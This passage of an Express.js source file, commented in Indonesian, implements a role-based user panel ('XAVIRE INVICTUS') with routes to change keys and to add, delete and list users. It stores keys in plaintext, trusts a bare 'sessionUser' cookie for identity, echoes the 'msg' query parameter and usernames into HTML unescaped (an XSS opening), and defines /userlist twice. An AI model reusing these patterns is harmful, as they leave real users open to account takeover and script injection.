        .back-link:hover { color: var(--primary); }
    </style>
</head>
<body>
    <div id="particles"></div>
    <div class="content">
        <div class="header">
            <h2>CORE SECURITY</h2>
            <p style="font-size: 11px; color: #666; font-family: 'Orbitron';">AUTHENTICATION OVERRIDE</p>
        </div>

        <div class="form-container">
            <div style="text-align: center; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 25px; padding-bottom: 10px;">
                <div class="role-display">${role}</div>
                <h3 style="margin-bottom: 15px; font-family: 'Rajdhani'; letter-spacing: 3px; color: #eee;">
                    USR: <span style="color: var(--primary)">${username.toUpperCase()}</span>
                </h3>
            </div>

            <form action="/update-key" method="POST">
                <div class="form-group">
                    <label><i class="fas fa-shield-alt"></i> CURRENT ACCESS KEY</label>
                    <input type="password" name="oldKey" placeholder="••••••••" required autocomplete="current-password">
                </div>

                <div class="form-group">
                    <label><i class="fas fa-key"></i> NEW ACCESS KEY</label>
                    <input type="text" name="newKey" placeholder="Enter new sequence" required autocomplete="new-password">
                </div>

                <button type="submit" class="btn-update">
                    <i class="fas fa-sync-alt"></i> UPDATE DATABASE
                </button>
            </form>

            <a href="/dashboard" class="back-link"><i class="fas fa-arrow-left"></i> RETURN TO TERMINAL</a>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#1a4a1a',
                lineColor: '#1a4a1a',
                density: 12000,
                proximity: 100
            });
        });
    </script>
</body>
</html>
    `);
});

app.post('/update-key', (req, res) => {
    // Gunakan .trim() untuk membersihkan spasi di awal/akhir input
    const oldKey = req.body.oldKey ? req.body.oldKey.trim() : "";
    const newKey = req.body.newKey ? req.body.newKey.trim() : "";
    const username = req.session?.username;

    // Proteksi jika session hilang
    if (!username) {
        return res.send("Sesi berakhir. Silakan login kembali.");
    }

    let users = [];
    try {
        const data = fs.readFileSync(userFilePath, 'utf8');
        users = JSON.parse(data);
    } catch (err) {
        console.error("Gagal membaca file user.json:", err);
    }

    // DEBUG: Cek di terminal apakah data yang dicari sesuai
    // console.log(`Memeriksa User: ${username} | Input Key: ${oldKey}`);

    // Validasi: pastikan username cocok dan key cocok (gunakan trim juga pada data DB)
    const userIndex = users.findIndex(u => 
        u.username.toLowerCase() === username.toLowerCase() && 
        u.key.toString().trim() === oldKey
    );

    let status, message, icon, themeColor;

    if (userIndex !== -1) {
        // --- PROSES UPDATE ---
        users[userIndex].key = newKey;

        try {
            fs.writeFileSync(userFilePath, JSON.stringify(users, null, 2), 'utf8');
            
            status = "SUCCESS";
            message = "Database core telah disinkronisasi. Key baru telah diaktifkan.";
            icon = "fa-check-double";
            themeColor = "#32CD32"; 
        } catch (err) {
            status = "SYSTEM ERROR";
            message = "Gagal menulis ke database. Periksa izin akses file.";
            icon = "fa-microchip";
            themeColor = "#ffa500";
        }
    } else {
        // --- PROSES GAGAL ---
        status = "ACCESS DENIED";
        message = "Password lama salah. Identitas gagal diverifikasi oleh sistem.";
        icon = "fa-exclamation-triangle";
        themeColor = "#ff4b2b";
    }

    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>${status} - DIGITAL CORE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        :root { --primary: ${themeColor}; --bg-dark: #050505; }
        body { font-family: 'Poppins', sans-serif; background: var(--bg-dark); color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; margin: 0; }
        #particles { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 0; opacity: 0.2; }
        .content { position: relative; z-index: 2; width: 100%; max-width: 450px; padding: 20px; }
        .status-card { background: rgba(10, 10, 10, 0.85); border: 1px solid rgba(255,255,255,0.1); padding: 40px; border-radius: 25px; backdrop-filter: blur(20px); text-align: center; border-top: 3px solid var(--primary); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .icon-box { width: 70px; height: 70px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: var(--primary); border: 2px solid var(--primary); border-radius: 50%; box-shadow: 0 0 15px var(--primary); }
        h2 { font-family: 'Orbitron', sans-serif; font-size: 18px; margin-bottom: 15px; letter-spacing: 3px; color: var(--primary); }
        p { color: #ccc; font-size: 13px; line-height: 1.6; margin-bottom: 30px; }
        .btn-action { display: inline-block; width: 100%; padding: 14px; background: transparent; color: var(--primary); border: 1px solid var(--primary); text-decoration: none; border-radius: 8px; font-family: 'Orbitron', sans-serif; font-weight: bold; font-size: 11px; transition: 0.3s; text-transform: uppercase; text-align: center; }
        .btn-action:hover { background: var(--primary); color: #000; box-shadow: 0 0 20px var(--primary); }
    </style>
</head>
<body>
    <div id="particles"></div>
    <div class="content">
        <div class="status-card">
            <div class="icon-box"><i class="fas ${icon}"></i></div>
            <h2>${status}</h2>
            <p>${message}</p>
            <a href="${userIndex !== -1 ? '/dashboard' : '/edit-key'}" class="btn-action">
                <i class="fas ${userIndex !== -1 ? 'fa-home' : 'fa-redo'}"></i> 
                ${userIndex !== -1 ? 'Return to System' : 'Retry Verification'}
            </a>
        </div>
    </div>
    <script>
        $(document).ready(function() {
            $('#particles').particleground({ dotColor: '${themeColor}', lineColor: '${themeColor}', density: 12000 });
        });
    </script>
</body>
</html>
    `);
});


// TAMBAHKAN route ini SEBELUM route POST /adduser
app.get("/adduser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa menambah user.");
  }

  // Tentukan opsi role berdasarkan role current user
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
      <option value="admin">Admin</option>
      <option value="owner">Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
    `;
  } else {
    // Reseller hanya bisa buat user biasa
    roleOptions = `<option value="user">User</option>`;
  }

  const html = `
  <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XAVIRE INVICTUS - Add User Core</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Plus+Jakarta+Sans:wght@300;400;600&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        :root {
            --bg-black: #05010a;
            --accent-purple: #bc13fe;
            --accent-cyan: #00f2ff;
            --text-main: #ffffff;
            --text-mute: #a193bd;
            --glass: rgba(20, 10, 35, 0.7);
            --border: rgba(188, 19, 254, 0.2);
            --neon-gradient: linear-gradient(135deg, #bc13fe 0%, #00f2ff 100%);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: var(--bg-black);
            color: var(--text-main);
            min-height: 100vh;
            padding: 40px 20px;
            position: relative;
            overflow-y: auto;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(188, 19, 254, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(0, 242, 255, 0.05) 0%, transparent 40%);
        }

        #particles {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            opacity: 0.4;
        }

        .content {
            position: relative;
            z-index: 2;
            max-width: 520px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 26px;
            font-weight: 700;
            background: var(--neon-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 3px;
            filter: drop-shadow(0 0 10px rgba(188, 19, 254, 0.3));
        }

        /* Container */
        .form-container {
            background: var(--glass);
            border: 1px solid var(--border);
            padding: 35px;
            border-radius: 35px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }

        /* Info Session */
        .session-card {
            background: rgba(255, 255, 255, 0.03);
            padding: 18px;
            border-radius: 20px;
            margin-bottom: 25px;
            border: 1px solid rgba(188, 19, 254, 0.15);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
            margin-bottom: 5px;
        }

        .info-label { color: var(--text-mute); }
        .info-value { font-weight: 600; font-family: 'JetBrains Mono', monospace; }

        /* Role Badges */
        .badge {
            padding: 4px 12px;
            border-radius: 8px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
        }
        .role-owner { background: #FFD700; color: #000; }
        .role-admin { background: #ff0055; color: #fff; }
        .role-reseller { background: var(--accent-cyan); color: #000; }
        .role-user { border: 1px solid var(--accent-purple); color: var(--accent-purple); }

        /* Input Styles */
        .form-group { margin-bottom: 20px; }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 11px;
            font-weight: 600;
            color: var(--accent-cyan);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        input, select {
            width: 100%;
            padding: 15px 18px;
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            background: rgba(10, 5, 20, 0.4);
            color: #fff;
            font-size: 14px;
            transition: all 0.3s ease;
            outline: none;
        }

        input:focus, select:focus {
            border-color: var(--accent-purple);
            box-shadow: 0 0 15px rgba(188, 19, 254, 0.2);
            background: rgba(20, 10, 35, 0.6);
        }

        /* Buttons */
        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 30px;
        }

        .btn {
            flex: 1;
            padding: 16px;
            border: none;
            border-radius: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            font-family: 'Orbitron', sans-serif;
            font-size: 11px;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-decoration: none;
        }

        .btn-execute {
            background: var(--neon-gradient);
            color: #fff;
            box-shadow: 0 8px 20px rgba(188, 19, 254, 0.3);
        }

        .btn-execute:hover {
            transform: translateY(-2px);
            filter: brightness(1.2);
            box-shadow: 0 12px 25px rgba(188, 19, 254, 0.5);
        }

        .btn-abort {
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        /* Protocol Box */
        .protocol-box {
            background: rgba(0, 242, 255, 0.03);
            padding: 15px;
            border-radius: 15px;
            font-size: 12px;
            color: var(--accent-cyan);
            border: 1px solid rgba(0, 242, 255, 0.1);
            margin-top: 20px;
            text-align: center;
        }

        .warning-text {
            font-size: 10px;
            color: var(--text-mute);
            text-align: center;
            margin-top: 20px;
            opacity: 0.7;
        }

        @media (max-width: 500px) {
            .form-container { padding: 25px 20px; }
            .button-group { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div id="particles"></div>

    <div class="content">
        <div class="header">
            <h2><i class="fas fa-user-plus"></i> ADD USER</h2>
        </div>

        <div class="form-container">
            <div class="session-card">
                <div class="info-row">
                    <span class="info-label">Current Auth:</span>
                    <span class="info-value"><i class="fas fa-circle" style="color:var(--accent-cyan); font-size:7px; margin-right:5px;"></i> ${username}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Privilege:</span>
                    <span class="info-value">
                        <span class="badge role-${role}">
                            ${role}
                        </span>
                    </span>
                </div>
            </div>

            <form method="POST" action="/adduser">
                <div class="form-group">
                    <label><i class="fas fa-id-card"></i> Username</label>
                    <input type="text" name="username" placeholder="Target identity name" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-key"></i> Access Key</label>
                    <input type="text" name="password" placeholder="Secure credentials" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-user-tag"></i> Assign Level</label>
                    <select name="role" required>
                        ${roleOptions}
                    </select>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-clock"></i> Lifetime (Days)</label>
                    <input type="number" name="durasi" min="1" max="365" value="30" required>
                </div>

                <div class="protocol-box">
                    <i class="fas fa-terminal"></i> 
                    <strong>CMD:</strong> ${role === 'reseller' ? 'SUB_USER_ONLY' : 'ELEVATED_PROVISIONING'}
                </div>

                <div class="button-group">
                    <button type="submit" class="btn btn-execute">
                        <i class="fas fa-microchip"></i> ADD USERS
                    </button>
                    <a href="/dashboard" class="btn btn-abort">
                        <i class="fas fa-power-off"></i> BACK
                    </a>
                </div>
            </form>
            
            <div class="warning-text">
                <i class="fas fa-info-circle"></i> Review details carefully. System logs all provisioning activities.
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#301050',
                lineColor: '#301050',
                density: 12000,
                proximity: 100,
                curvedLines: false
            });
        });
    </script>
</body>
</html>
  `;
  res.send(html);
});

app.post("/hapususer", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { username: targetUsername } = req.body;

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒

  // 1. Tidak bisa hapus diri sendiri
  if (sessionUsername === targetUsername) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // 2. Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh hapus user biasa.");
  }

  // 3. Admin tidak boleh hapus admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa hapus admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa hapus owner.");
    }
  }

  // 4. Owner bisa hapus semua kecuali diri sendiri

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== targetUsername);
  saveUsers(filtered);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + targetUsername + " berhasil dihapus");
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  // Tombol Tambah User Baru
  const addUserButton = `
    <div style="text-align: center; margin: 20px 0;">
      <a href="/adduser" class="btn-add-user">
        <i class="fas fa-user-plus"></i> TAMBAH USER BARU
      </a>
    </div>
  `;

  const html = `
   <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>XAVIRE INVICTUS - User Directory</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Plus+Jakarta+Sans:wght@300;400;600&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    :root {
      --bg-black: #05010a;
      --accent-purple: #bc13fe;
      --accent-cyan: #00f2ff;
      --text-main: #ffffff;
      --text-mute: #a193bd;
      --glass: rgba(20, 10, 35, 0.7);
      --border: rgba(188, 19, 254, 0.2);
      --neon-gradient: linear-gradient(135deg, #bc13fe 0%, #00f2ff 100%);
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Plus Jakarta Sans', sans-serif;
      background: var(--bg-black);
      color: var(--text-main);
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-y: auto;
      background-image: radial-gradient(circle at 50% 50%, rgba(188, 19, 254, 0.05) 0%, transparent 80%);
    }

    #particles {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      z-index: 0;
      opacity: 0.3;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1100px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 10px;
    }

    .header h2 {
      font-family: 'Orbitron', sans-serif;
      font-size: 26px;
      text-transform: uppercase;
      letter-spacing: 4px;
      background: var(--neon-gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 8px;
    }

    /* Stats Bar Custom */
    .stats-bar {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 15px;
      margin-bottom: 25px;
    }

    .stat-item {
      background: var(--glass);
      padding: 15px;
      border-radius: 20px;
      border: 1px solid var(--border);
      text-align: center;
      backdrop-filter: blur(10px);
    }

    .stat-value {
      font-size: 20px;
      font-weight: 700;
      font-family: 'Orbitron', sans-serif;
      color: var(--accent-cyan);
    }

    .stat-label {
      font-size: 10px;
      color: var(--text-mute);
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-top: 5px;
    }

    /* Action Buttons */
    .btn-add-user {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 14px 28px;
      background: var(--neon-gradient);
      color: #fff;
      text-decoration: none;
      border-radius: 15px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      font-size: 12px;
      margin-bottom: 25px;
      box-shadow: 0 10px 20px rgba(188, 19, 254, 0.3);
      transition: 0.3s;
    }

    .btn-add-user:hover {
      transform: translateY(-3px);
      filter: brightness(1.2);
    }

    /* Table Styling */
    .table-container {
      background: var(--glass);
      border-radius: 25px;
      border: 1px solid var(--border);
      overflow: hidden;
      backdrop-filter: blur(15px);
      box-shadow: 0 20px 40px rgba(0,0,0,0.4);
      margin-bottom: 30px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
    }

    th {
      background: rgba(188, 19, 254, 0.1);
      padding: 18px;
      text-align: left;
      font-family: 'Orbitron', sans-serif;
      font-size: 11px;
      color: var(--accent-cyan);
      text-transform: uppercase;
      letter-spacing: 1px;
      border-bottom: 1px solid var(--border);
    }

    td {
      padding: 16px 18px;
      border-bottom: 1px solid rgba(255,255,255,0.05);
      font-size: 13px;
      color: var(--text-main);
    }

    tr:hover td {
      background: rgba(188, 19, 254, 0.05);
    }

    /* Badges */
    .role-badge {
      padding: 4px 10px;
      border-radius: 6px;
      font-size: 10px;
      font-weight: 800;
      text-transform: uppercase;
      font-family: 'JetBrains Mono', monospace;
    }
    .role-owner { background: #FFD700; color: #000; }
    .role-admin { background: #ff0055; color: #fff; }
    .role-reseller { background: var(--accent-cyan); color: #000; }
    .role-user { border: 1px solid var(--accent-purple); color: var(--accent-purple); }

    .btn-edit {
      padding: 6px 12px;
      background: rgba(0, 242, 255, 0.1);
      border: 1px solid var(--accent-cyan);
      border-radius: 8px;
      color: var(--accent-cyan);
      text-decoration: none;
      font-size: 11px;
      font-weight: 600;
      transition: 0.3s;
    }

    .btn-edit:hover {
      background: var(--accent-cyan);
      color: #000;
    }

    .close-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      width: fit-content;
      padding: 12px 30px;
      margin: 20px auto;
      background: transparent;
      color: var(--text-mute);
      border-radius: 12px;
      text-decoration: none;
      font-size: 12px;
      font-family: 'Orbitron', sans-serif;
      border: 1px solid var(--border);
      transition: 0.3s;
    }

    .close-btn:hover {
      color: #fff;
      border-color: #fff;
      background: rgba(255,255,255,0.05);
    }

    /* Responsive */
    @media (max-width: 768px) {
      .table-container { overflow-x: auto; border-radius: 15px; }
      th, td { padding: 12px; min-width: 120px; }
      .header h2 { font-size: 20px; }
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-database"></i> USER DIRECTORY</h2>
      <p style="color: var(--text-mute); font-size: 13px;">Manage and monitor all authenticated identities</p>
    </div>

    ${messageHtml}

    <div style="text-align: center;">
      ${addUserButton}
    </div>

    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Node</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">End Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Admins</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-id-mask"></i> Identity</th>
            <th><i class="fas fa-shield-halved"></i> Access</th>
            <th><i class="fas fa-history"></i> Expiration</th>
            <th><i class="fas fa-hourglass-start"></i> Status</th>
            <th><i class="fas fa-bolt"></i> Action</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-power-off"></i> EXIT DIRECTORY
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#301050',
        lineColor: '#301050',
        density: 10000,
        proximity: 100,
        curvedLines: false
      });
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || ""; // Ambil pesan dari query parameter

  // Hanya owner, admin, reseller yang bisa akses
  if (!["owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    // Tentukan apakah user ini boleh diedit oleh current user
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false; // Tidak bisa edit diri sendiri
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false; // Reseller hanya bisa edit user
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner")) {
      canEdit = false; // Admin tidak bisa edit admin lain atau owner
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  // Tambahkan notifikasi pesan di HTML
  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  const html = `
   <!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>XAVIRE INVICTUS - User Central</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Plus+Jakarta+Sans:wght@300;400;600&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>

  <style>
    :root {
      --bg-black: #05010a;
      --accent-purple: #bc13fe;
      --accent-cyan: #00f2ff;
      --text-main: #ffffff;
      --text-mute: #a193bd;
      --glass: rgba(20, 10, 35, 0.7);
      --glass-border: rgba(188, 19, 254, 0.2);
      --neon-gradient: linear-gradient(135deg, #bc13fe 0%, #00f2ff 100%);
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Plus Jakarta Sans', sans-serif;
      background: var(--bg-black);
      color: var(--text-main);
      min-height: 100vh;
      padding: 40px 20px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
      background-image: 
          radial-gradient(circle at 50% -20%, rgba(188, 19, 254, 0.1) 0%, transparent 50%),
          radial-gradient(circle at 0% 100%, rgba(0, 242, 255, 0.05) 0%, transparent 40%);
    }

    #particles {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      z-index: 0;
      opacity: 0.3;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1100px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 40px;
    }

    .header h2 {
      font-family: 'Orbitron', sans-serif;
      font-size: 32px;
      font-weight: 700;
      background: var(--neon-gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-transform: uppercase;
      letter-spacing: 4px;
      margin-bottom: 12px;
      filter: drop-shadow(0 0 10px rgba(188, 19, 254, 0.3));
    }

    .header p {
      color: var(--text-mute);
      font-size: 12px;
      letter-spacing: 2px;
      text-transform: uppercase;
    }

    /* Tombol Add User */
    .btn-add-user {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 14px 28px;
      background: var(--neon-gradient);
      color: #FFFFFF;
      text-decoration: none;
      border-radius: 16px;
      font-family: 'Orbitron', sans-serif;
      font-weight: 600;
      font-size: 12px;
      letter-spacing: 1px;
      transition: all 0.3s ease;
      border: none;
      cursor: pointer;
      margin-bottom: 30px;
      box-shadow: 0 10px 20px rgba(188, 19, 254, 0.2);
    }

    .btn-add-user:hover {
      transform: translateY(-3px);
      filter: brightness(1.2);
      box-shadow: 0 15px 30px rgba(188, 19, 254, 0.4);
    }

    /* Stats Bar */
    .stats-bar {
      display: flex;
      justify-content: space-around;
      margin-bottom: 35px;
      padding: 25px;
      background: var(--glass);
      border: 1px solid var(--glass-border);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-radius: 25px;
    }

    .stat-item {
      text-align: center;
      flex: 1;
    }

    .stat-value {
      font-family: 'JetBrains Mono', monospace;
      font-size: 28px;
      font-weight: 700;
      color: var(--accent-cyan);
      display: block;
      text-shadow: 0 0 10px rgba(0, 242, 255, 0.3);
    }

